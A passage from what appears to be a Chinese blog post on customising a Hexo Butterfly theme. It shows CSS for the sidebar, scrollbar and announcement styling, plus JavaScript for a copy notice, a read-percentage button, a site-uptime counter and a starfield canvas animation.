class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>导航栏和滚动条设置</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*导航栏改大小（字体大于16px会变形，所以要做配置）*/</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-id">#card-toc</span> <span class="selector-class">.toc-content</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">115%</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> -<span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*滚动条设置*/</span></span><br><span class="line">::-webkit-scrollbar &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10px</span>; <span class="comment">/*大小*/</span></span><br><span class="line">&#125;</span><br><span class="line">::-webkit-scrollbar-thumb &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#14c6d3</span>; <span class="comment">/* 颜色 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>; <span class="comment">/* 圆角 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">::-webkit-scrollbar-track &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f1f1f1</span>; <span class="comment">/* 背景色 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>announcement.css</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*公告栏配置（标签自己加载公告栏里）*/</span></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span><span class="selector-class">.announcement_content</span> card_announce_top</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">  <span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">154</span>, <span class="number">35</span>, <span class="number">35</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span><span class="selector-class">.announcement_content</span> card_announce_tip</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">106</span>, <span class="number">151</span>, <span class="number">112</span>, <span class="number">0.2</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>; <span class="comment">/* 圆角 */</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span><span class="selector-class">.announcement_content</span> <span class="selector-tag">a</span><span class="selector-class">.strong</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#DA20D8</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>readPercent.css</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*引用大佬的css*/</span></span><br><span class="line"><span class="comment">/* 返回顶部 */</span></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">15px</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12px</span><span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">margin-right</span>: -<span class="number">1px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标滑动到按钮上时显示返回顶部图标 */</span></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-id">#go-up</span><span class="selector-pseudo">:hover</span> <span class="selector-id">#percent</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><h3 id="JS插件"><a href="#JS插件" class="headerlink" title="JS插件"></a>JS插件</h3><details class="folding-tag" blue><summary> 详细配置过程 </summary>              <div class="content">              <p>butterfly中引入js文件</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">bottom:</span></span><br><span class="line">  <span class="comment"># - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js&quot;&gt;&lt;/script&gt;</span> <span class="comment"># 引入VUE(f12)</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">async</span> <span class="string">src=&quot;https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js&quot;&gt;&lt;/script&gt;</span> <span class="comment"># 引入ElementUI(f12)</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;canvas</span> <span class="string">id=&quot;universe&quot;&gt;&lt;/canvas&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/universe.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">data-pjax</span> <span class="string">src=&quot;/js/readPercent.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/copy.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><strong>copy.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js并小改了一下</span></span><br><span class="line"><span class="comment">// 防抖全局计时器</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">TT</span> = <span class="literal">null</span>;    <span class="comment">//time用来控制事件的触发</span></span><br><span class="line"><span class="comment">// 防抖函数:fn-&gt;逻辑 time-&gt;防抖时间</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, time</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable constant_">TT</span> !== <span class="literal">null</span>) <span class="built_in">clearTimeout</span>(<span class="variable constant_">TT</span>);</span><br><span class="line">    <span class="variable constant_">TT</span> = <span class="built_in">setTimeout</span>(fn, time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制提醒</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;copy&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">debounce</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.$notify(&#123;</span><br><span class="line">                    <span class="attr">title</span>: <span class="string">&quot;复制成功&quot;</span>,</span><br><span class="line">                    <span class="attr">message</span>: <span class="string">&quot;转载记得保留原文链接哦! &quot;</span>,</span><br><span class="line">                    <span class="attr">position</span>: <span class="string">&#x27;top-left&#x27;</span>,</span><br><span class="line">                    <span class="attr">offset</span>: <span class="number">50</span>,</span><br><span class="line">                    <span class="attr">showClose</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">type</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                    <span class="attr">duration</span>: <span class="number">5000</span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;, <span class="number">300</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁用控制台</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params">e</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">123</span> == <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> || (e.<span class="property">ctrlKey</span> &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; (<span class="number">74</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span> || <span class="number">73</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span>|| <span class="number">67</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span>)) || (e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">85</span> === <span class="variable language_">window</span>.<span class="property">event</span>.<span class="property">keyCode</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_">debounce</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">                <span class="attr">data</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.$notify(&#123;</span><br><span class="line">                        <span class="attr">title</span>: <span class="string">&quot;检测到控制台被打开&quot;</span>,</span><br><span class="line">                        <span class="attr">message</span>: <span class="string">&quot;扒取源码要遵循GPL协议哦！&quot;</span>,</span><br><span class="line">                        <span class="attr">position</span>: <span class="string">&#x27;top-left&#x27;</span>,</span><br><span class="line">                        <span class="attr">offset</span>: <span class="number">50</span>,</span><br><span class="line">                        <span class="attr">showClose</span>: <span class="literal">true</span>,</span><br><span class="line">                        <span class="attr">type</span>: <span class="string">&quot;info&quot;</span>,</span><br><span class="line">                        <span class="attr">duration</span>: <span class="number">5000</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;, <span class="number">300</span>);</span><br><span class="line">        <span class="comment">// return window.event.keyCode = 0,window.event.preventDefault(),!1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>readPercent.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onscroll</span> = percent;<span class="comment">// 执行函数</span></span><br><span class="line"><span class="comment">// 页面百分比</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">percent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span> || <span class="variable language_">window</span>.<span class="property">pageYOffset</span>, <span class="comment">// 卷去高度</span></span><br><span class="line">        b = <span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollHeight</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">offsetHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">offsetHeight</span>, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span>, <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>) - <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span>, <span class="comment">// 整个网页高度</span></span><br><span class="line">        result = <span class="title class_">Math</span>.<span class="title function_">round</span>(a / b * <span class="number">100</span>), <span class="comment">// 计算百分比</span></span><br><span class="line">        up = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#go-up&quot;</span>); <span class="comment">// 获取按钮</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &gt;= <span class="number">95</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">        up.<span class="property">childNodes</span>[<span class="number">1</span>].<span class="property">innerHTML</span> = result + <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>runtime.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js并小改了一下</span></span><br><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createtime</span>(<span class="params"></span>) &#123;</span><br><span class="line">    now.<span class="title function_">setTime</span>(now.<span class="title function_">getTime</span>() + <span class="number">1e3</span>);</span><br><span class="line">    <span class="comment">//var e = new Date(&quot;05/20/2023 00:00:00&quot;)</span></span><br><span class="line">      <span class="comment">//, t = Math.trunc(234e8 + (now - e) / 1e3 * 17)</span></span><br><span class="line">      <span class="comment">//, a = (t / 1496e5).toFixed(6)</span></span><br><span class="line">      <span class="comment">//, </span></span><br><span class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;05/20/2023 00:00:00&quot;</span>)</span><br><span class="line">      , n = (now - o) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span></span><br><span class="line">      , r = <span class="title class_">Math</span>.<span class="title function_">floor</span>(n)</span><br><span class="line">      , i = (now - o) / <span class="number">1e3</span> / <span class="number">60</span> / <span class="number">60</span> - <span class="number">24</span> * r</span><br><span class="line">      , s = <span class="title class_">Math</span>.<span class="title function_">floor</span>(i);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(s).<span class="property">length</span> &amp;&amp; (s = <span class="string">&quot;0&quot;</span> + s);</span><br><span class="line">    <span class="keyword">var</span> d = (now - o) / <span class="number">1e3</span> / <span class="number">60</span> - <span class="number">1440</span> * r - <span class="number">60</span> * s</span><br><span class="line">      , l = <span class="title class_">Math</span>.<span class="title function_">floor</span>(d);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(l).<span class="property">length</span> &amp;&amp; (l = <span class="string">&quot;0&quot;</span> + l);</span><br><span class="line">    <span class="keyword">var</span> g = (now - o) / <span class="number">1e3</span> - <span class="number">86400</span> * r - <span class="number">3600</span> * s - <span class="number">60</span> * l</span><br><span class="line">      , b = <span class="title class_">Math</span>.<span class="title function_">round</span>(g);</span><br><span class="line">    <span class="number">1</span> == <span class="title class_">String</span>(b).<span class="property">length</span> &amp;&amp; (b = <span class="string">&quot;0&quot;</span> + b);</span><br><span class="line">    <span class="keyword">let</span> c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    c = s &lt; <span class="number">18</span> &amp;&amp; s &gt;= <span class="number">9</span> ? <span class="string">`&lt;img class=&quot;boardsign&quot; src=&quot;https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg&quot; title=&quot;偶尔摸鱼有害健康，常常摸鱼收获满满~&quot;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站已运行了 <span class="subst">$&#123;r&#125;</span> 天 <span class="subst">$&#123;s&#125;</span> 小时 <span class="subst">$&#123;l&#125;</span> 分 <span class="subst">$&#123;b&#125;</span> 秒 &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;/div&gt;`</span> : <span class="string">`&lt;img class=&quot;boardsign&quot; src=&quot;https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg&quot; title=&quot;下班了就该开开心心地玩耍~&quot;&gt;&lt;br&gt; &lt;div style=&quot;font-size:13px;font-weight:bold&quot;&gt;本站已运行了 <span class="subst">$&#123;r&#125;</span> 天 <span class="subst">$&#123;s&#125;</span> 小时 <span class="subst">$&#123;l&#125;</span> 分 <span class="subst">$&#123;b&#125;</span> 秒 &lt;i id=&quot;heartbeat&quot; class=&quot;fas fa-heartbeat&quot;&gt;&lt;/i&gt;&lt;/div&gt;`</span>,</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>) &amp;&amp; (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;workboard&quot;</span>).<span class="property">innerHTML</span> = c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setInterval</span>((<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="title function_">createtime</span>()</span><br><span class="line">&#125;</span><br><span class="line">), <span class="number">1e3</span>);</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p><strong>universe.js</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用大佬的js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dark</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> = <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span> || <span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span> || <span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span> || <span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>;</span><br><span class="line">    <span class="keyword">var</span> n, e, i, h, t = <span class="number">.05</span>, s = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;universe&quot;</span>), o = !<span class="number">0</span>, a = <span class="string">&quot;180,184,240&quot;</span>, r = <span class="string">&quot;226,225,142&quot;</span>, d = <span class="string">&quot;226,225,224&quot;</span>, c = [];</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">        n = <span class="variable language_">window</span>.<span class="property">innerWidth</span>,</span><br><span class="line">        e = <span class="variable language_">window</span>.<span class="property">innerHeight</span>,</span><br><span class="line">        i = <span class="number">.216</span> * n,</span><br><span class="line">        s.<span class="title function_">setAttribute</span>(<span class="string">&quot;width&quot;</span>, n),</span><br><span class="line">        s.<span class="title function_">setAttribute</span>(<span class="string">&quot;height&quot;</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>) &#123;</span><br><span class="line">        h.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, n, e);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = c.<span class="property">length</span>, i = <span class="number">0</span>; i &lt; t; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> s = c[i];</span><br><span class="line">            s.<span class="title function_">move</span>(),</span><br><span class="line">            s.<span class="title function_">fadeIn</span>(),</span><br><span class="line">            s.<span class="title function_">fadeOut</span>(),</span><br><span class="line">            s.<span class="title function_">draw</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">reset</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">giant</span> = <span class="title function_">m</span>(<span class="number">3</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">comet</span> = !<span class="variable language_">this</span>.<span class="property">giant</span> &amp;&amp; !o &amp;&amp; <span class="title function_">m</span>(<span class="number">10</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x</span> = <span class="title function_">l</span>(<span class="number">0</span>, n - <span class="number">10</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">y</span> = <span class="title function_">l</span>(<span class="number">0</span>, e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">r</span> = <span class="title function_">l</span>(<span class="number">1.1</span>, <span class="number">2.6</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dx</span> = <span class="title function_">l</span>(t, <span class="number">6</span> * t) + (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>) * t * <span class="title function_">l</span>(<span class="number">50</span>, <span class="number">120</span>) + <span class="number">2</span> * t,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">dy</span> = -<span class="title function_">l</span>(t, <span class="number">6</span> * t) - (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>) * t * <span class="title function_">l</span>(<span class="number">50</span>, <span class="number">120</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingOut</span> = <span class="literal">null</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingIn</span> = !<span class="number">0</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">0</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacityTresh</span> = <span class="title function_">l</span>(<span class="number">.2</span>, <span class="number">1</span> - <span class="number">.4</span> * (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>)),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">do</span> = <span class="title function_">l</span>(<span class="number">5e-4</span>, <span class="number">.002</span>) + <span class="number">.001</span> * (<span class="variable language_">this</span>.<span class="property">comet</span> + <span class="number">1</span> - <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fadeIn</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingIn</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingIn</span> = !(<span class="variable language_">this</span>.<span class="property">opacity</span> &gt; <span class="variable language_">this</span>.<span class="property">opacityTresh</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacity</span> += <span class="variable language_">this</span>.<span class="property">do</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fadeOut</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">fadingOut</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingOut</span> = !(<span class="variable language_">this</span>.<span class="property">opacity</span> &lt; <span class="number">0</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">opacity</span> -= <span class="variable language_">this</span>.<span class="property">do</span> / <span class="number">2</span>,</span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">x</span> &gt; n || <span class="variable language_">this</span>.<span class="property">y</span> &lt; <span class="number">0</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingOut</span> = !<span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()))</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">draw</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (h.<span class="title function_">beginPath</span>(),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">giant</span>)</span><br><span class="line">                h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + a + <span class="string">&quot;,&quot;</span> + <span class="variable language_">this</span>.<span class="property">opacity</span> + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>, !<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">comet</span>) &#123;</span><br><span class="line">                h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + d + <span class="string">&quot;,&quot;</span> + <span class="variable language_">this</span>.<span class="property">opacity</span> + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="number">1.5</span>, <span class="number">0</span>, <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span>, !<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; <span class="number">30</span>; t++)</span><br><span class="line">                    h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + d + <span class="string">&quot;,&quot;</span> + (<span class="variable language_">this</span>.<span class="property">opacity</span> - <span class="variable language_">this</span>.<span class="property">opacity</span> / <span class="number">20</span> * t) + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                    h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span> - <span class="variable language_">this</span>.<span class="property">dx</span> / <span class="number">4</span> * t, <span class="variable language_">this</span>.<span class="property">y</span> - <span class="variable language_">this</span>.<span class="property">dy</span> / <span class="number">4</span> * t - <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>),</span><br><span class="line">                    h.<span class="title function_">fill</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                h.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(&quot;</span> + r + <span class="string">&quot;,&quot;</span> + <span class="variable language_">this</span>.<span class="property">opacity</span> + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="variable language_">this</span>.<span class="property">r</span>, <span class="variable language_">this</span>.<span class="property">r</span>);</span><br><span class="line">            h.<span class="title function_">closePath</span>(),</span><br><span class="line">            h.<span class="title function_">fill</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">move</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x</span> += <span class="variable language_">this</span>.<span class="property">dx</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">y</span> += <span class="variable language_">this</span>.<span class="property">dy</span>,</span><br><span class="line">            !<span class="number">1</span> === <span class="variable language_">this</span>.<span class="property">fadingOut</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">reset</span>(),</span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">x</span> &gt; n - n / <span class="number">4</span> || <span class="variable language_">this</span>.<span class="property">y</span> &lt; <span class="number">0</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fadingOut</span> = !<span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        ,</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            o = !<span class="number">1</span></span><br><span class="line">        &#125;, <span class="number">50</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">1e3</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="number">1</span> &lt; <span class="number">10</span> * t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t, i</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>() * (i - t) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">f</span>(),</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, f, !<span class="number">1</span>),</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        h = s.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; i; t++)</span><br><span class="line">            c[t] = <span class="keyword">new</span> y,</span><br><span class="line">            c[t].<span class="title function_">reset</span>();</span><br><span class="line">        <span class="title function_">u</span>()</span><br><span class="line">    &#125;(),</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span 